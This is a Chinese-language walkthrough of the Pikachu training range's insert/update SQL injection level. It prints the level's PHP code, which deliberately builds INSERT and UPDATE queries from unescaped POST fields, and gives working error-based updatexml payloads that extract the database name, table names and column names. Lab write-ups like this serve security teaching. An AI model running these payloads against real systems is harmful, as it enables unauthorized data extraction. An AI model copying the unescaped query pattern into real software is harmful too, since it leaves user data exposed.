# inster/update注入

# 一、代码审计

该关卡的代码如下

insert

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_insert.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";


$link=connect();

$html='';
if(isset($_POST['submit'])){
    if($_POST['username']!=null &&$_POST['password']!=null){
//      $getdata=escape($link, $_POST);//转义

        //没转义,导致注入漏洞,操作类型为insert
        $getdata=$_POST;
        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1){
            $html.="<p>注册成功,请返回<a href='sqli_login.php'>登录</a></p>";
        }else {
            $html.="<p>注册失败,请检查下数据库是否还活着</p>";

        }
    }else{
        $html.="<p>必填项不能为空哦</p>";
    }
}




?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../sqli.php">sqli</a>
                </li>
                <li class="active">注册</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="">
                点一下提示~
            </a>


        </div>
        <div class="page-content">

            <div id="reg_info">
                <form method="post">
                    <h1 class="reg_title">欢迎注册，请填写注册信息!</h1>
                    <p class="reg_name">用户:<input class="r_username" type="text" name="username" placeholder="必填" /></p>
                    <p class="reg_name">密码:<input class="r_username" type="text" name="password" placeholder="必填" /></p>
                    <p class="reg_sex">性别:<input class="r_sex" type="text" name="sex"  /></p>
                    <p class="reg_phone">手机:<input class="r_phonenum" type="text" name="phonenum"  /></p>
                    <p class="reg_email">地址:<input class="r_email" type="text" name="email"  /></p>
                    <p class="reg_add">住址:<input class="r_add" type="text" name="add"  /></p>
                    <input class="sub" type="submit" name="submit" value="submit"/>
                </form>
            </div>

            <?php echo $html;?>

        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

update

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_insert.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";


$link=connect();
// 判断是否登录，没有登录不能访问
if(!check_sqli_session($link)){
    echo "<script>alert('登录后才能进入会员中心哦')</script>";
    header("location:sqli_login.php");
}


$html1='';
if(isset($_POST['submit'])){
    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
//        $getdata=escape($link, $_POST);

        //未转义,形成注入,sql操作类型为update
        $getdata=$_POST;
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:sqli_mem.php");
        }else {
            $html1.='修改失败，请重试';

        }
    }
}

?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../sqli.php">sqli</a>
                </li>
                <li class="active">edit</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="没啥好提示的,自己看着办">
                点一下提示~
            </a>


        </div>
        <div class="page-content">

            <?php
            //通过当前session-name到数据库查询，并显示其对应信息
            $username=$_SESSION['sqli']['username'];
            $query="select * from member where username='$username'";
            $result=execute($link, $query);
            $data=mysqli_fetch_array($result, MYSQL_ASSOC);
            $name=$data['username'];
            $sex=$data['sex'];
            $phonenum=$data['phonenum'];
            $add=$data['address'];
            $email=$data['email'];

            $html=<<<A
<div id="per_info">
   <form method="post">
   <h1 class="per_title">hello,{$name},欢迎来到个人会员中心 | <a style="color:bule;" href="sqli_mem.php?logout=1">退出登录</a></h1>
   <p class="per_name">姓名:{$name}</p>
   <p class="per_sex">性别:<input type="text" name="sex" value="{$sex}"/></p>
   <p class="per_phone">手机:<input class="phonenum" type="text" name="phonenum" value="{$phonenum}"/></p>    
   <p class="per_add">住址:<input class="add" type="text" name="add" value="{$add}"/></p> 
   <p class="per_email">邮箱:<input class="email" type="text" name="email" value="{$email}"/></p> 
   <input class="sub" type="submit" name="submit" value="submit"/>
   </form>
</div>
A;
            echo $html;
            echo $html1;

            ?>




        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察源码可以看到代码对传入的数据未进行转义，未对SQL注入进行防护

***

# 二、通关教程

## insert

发现有个注册页面，注册页面如果有注入漏洞的话，一般是insert类型的，因为注册相当于往数据库的表中插入一行新数据。填写注册信息，然后抓个包，可以看到时post形式传输的数据

![image-20230305131522785](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305131522785.png)

尝试在admin1后加单引号，报错了而且报错信息中没有出现admin，可能是单引号完成闭合了，最后还需要加个）完成闭合

![image-20230305131750835](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305131750835.png)

添加其他参数和）构建闭合

```
admin1','111','222','333','444','555')#
```

![image-20230305131954705](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305131954705.png)

构建好闭合了，但是这个注册页面是没有回显的，怎样查询数据呢，我们可以采用报错注入的形式让查询的数据显示在报错页面中,完整提交的post数据,payload里面是or或者and都可以，注意最后可以不用注释符，把第一个参数的单引号闭合就可以了

```
username=admiin' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or' 
&password=admin1&sex=11&phonenum=11111111&email=1111&add=1111&submit=submit
```

![image-20230305132246461](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305132246461.png)

然后就是替换database()，查询其他数据。下面查询的长度超出updatexml函数的显示范围了（显示32个字符），需要在payload中加substr()函数来把剩下的字符显示出来，拼接起来就是查询出的数据，查询表的payload如下

```
username=admin1' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or'
&password=admin1&sex=11&phonenum=11111111&email=1111&add=1111&submit=submit
```

![image-20230305132538688](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305132538688.png)

明显最后一个表没有查询完整，调整一下payload中的值

```
username=admin1' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,31),0x7e),1) or'
&password=admin1&sex=11&phonenum=11111111&email=1111&add=1111&submit=submit
```

![image-20230305132809669](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305132809669.png)

两次拼接起来，查询到的完整表名为

```
httpinfo,member,message,users,xssblind
```

查询user表的列

```
username=admin1' or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,31),0x7e),1) or'
&password=admin1&sex=11&phonenum=11111111&email=1111&add=1111&submit=submit
```

![image-20230305133229267](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305133229267.png)

```
username=admin1' or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),32,31),0x7e),1) or'
&password=admin1&sex=11&phonenum=11111111&email=1111&add=1111&submit=submit
```

![image-20230305133412159](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305133412159.png)

```
username=admin1' or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),63,31),0x7e),1) or'
&password=admin1&sex=11&phonenum=11111111&email=1111&add=1111&submit=submit
```

![image-20230305133451847](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305133451847.png)

## Update注入

同insert注入